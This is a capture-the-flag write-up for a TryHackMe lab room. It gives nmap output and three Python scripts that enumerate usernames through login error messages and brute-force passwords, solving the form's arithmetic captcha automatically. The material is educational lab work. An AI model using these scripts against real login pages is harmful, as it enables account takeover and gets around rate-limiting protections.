---
title: THM Capture
author: hanhctf
date: 2023-05-07 20:22:22 +0700
categories: [Write-up, THM]
tags: [brute-forece]
toc: true
mermaid: true
---

# [**THM Capture**](https://tryhackme.com/room/capture)

## NMAP

```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 15:40 +07
Nmap scan report for 10.10.236.121
Host is up (0.31s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Sat, 06 May 2023 08:41:04 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Sat, 06 May 2023 08:40:57 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Sat, 06 May 2023 08:40:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

```

## Web enumeratio

Login form with username and password provided.  
Try brute-force with `Intruder' --> After 10 requests, the website ask math captcha.

Time to write a script solve math captcha to brute-force

View `Hint'  

```
Look at the error messages from the application when attempting to log in. Enumerate to discover the username (firstname). Then enumerate once more to discover the password.
```

### Brute-force username first

***ignore proxy if you dont open burpsuite***

```python
import requests
import re

url = "http://10.10.32.158/login"

# ignore proxy if you dont open burpsuite
proxy = {"http":"127.0.0.1:8080"}

credentials = {"username":"admin", "password":"admin", "captcha":"1"}

username = open("usernames.txt", "r")
password = open("passwords.txt", "r")

#Function to extract math captcha question
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    if match:
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        return answer
    else:
        return None
    
captcha_answer = 1

#Brute-force username
for name in username.read().splitlines():
    credentials = {"username": name, "password": 'password',"captcha": captcha_answer}
    # ignore proxy if you dont open burpsuite
    req = requests.post(url, proxies = proxy, data = credentials)
    captcha_answer = extract_captcha(req.text)
    message_captcha = re.search(r'Error:</strong> Invalid captcha', req.text)
    message_catch = re.search(r'Error:</strong> The user(.+)', req.text)
    if message_catch:
        error_message = message_catch.group(1)
        print(f"{name} Error message: {error_message}")
    # Because first entry error invalid captcha :)). We can actually skip this elif.
    elif message_captcha:
        print(f"{name} Error message: {message_captcha}")
    else:
        print(f"Username: {name}")
        break
```

### Brute-force password

***ignore proxy if you dont open burpsuite***

```python
import requests
import re

url = "http://10.10.32.158/login"

# ignore proxy if you dont open burpsuite
proxy = {"http":"127.0.0.1:8080"}

credentials = {"username":"admin", "password":"admin", "captcha":"1"}

username = open("usernames.txt", "r")
password = open("passwords.txt", "r")

#Function to extract math captcha question
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    if match:
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        return answer
    else:
        return None
    
captcha_answer = 1

# Brute force password
for passwd in password.read().splitlines():
    
    credentials = {"username": 'natalie', "password": passwd,"captcha": captcha_answer}
    # ignore proxy if you dont open burpsuite
    req = requests.post(url, proxies = proxy, data = credentials)
    captcha_answer = extract_captcha(req.text)
    message_passwd = re.search(r'Error(.+)', req.text)
    if message_passwd:
        error_message = message_passwd.group(1)
        print(f"{passwd} - Error message: {error_message}")
    else:
        print(f"Login credential: natalie and {passwd}")
        break    

```

### Brute-force both

***ignore proxy if you dont open burpsuite***

```python
import requests
import re

url = "http://10.10.32.158/login"

# ignore proxy if you dont open burpsuite
proxy = {"http":"127.0.0.1:8080"}

credentials = {"username":"admin", "password":"admin", "captcha":"1"}

username = open("usernames.txt", "r")
password = open("passwords.txt", "r")

#Function to extract math captcha question
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    if match:
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        return answer
    else:
        return None
    
captcha_answer = 1

for name in username.read().splitlines():
    credentials = {"username": name, "password": 'password',"captcha": captcha_answer}
    req = requests.post(url, proxies = proxy, data = credentials)
    captcha_answer = extract_captcha(req.text)
    message_username = re.search(r'Error:</strong> Invalid password(.+)', req.text) #Get message with valid username
    # In the wild, login form usualy use same message for invalid username or invalid passord like
    # "Invalid credential"
    # ...... 
    # We can use regex r'Error(.+)' for message
    print(message_username)
    if message_username:
        for passwd in password.read().splitlines():
                credentials = {"username": name, "password": passwd,"captcha": captcha_answer}
                # ignore proxy if you dont open burpsuite
                req = requests.post(url, proxies = proxy, data = credentials)
                captcha_answer = extract_captcha(req.text)
                message_passwd = re.search(r'Error(.+)', req.text) # Get message invalid password
                if message_passwd:
                    error_message = message_passwd.group(1)
                    print(f"{passwd} - Error message: {error_message}")
                else:
                    print(f"Login credential: {name} and {passwd}.")
                    break

```
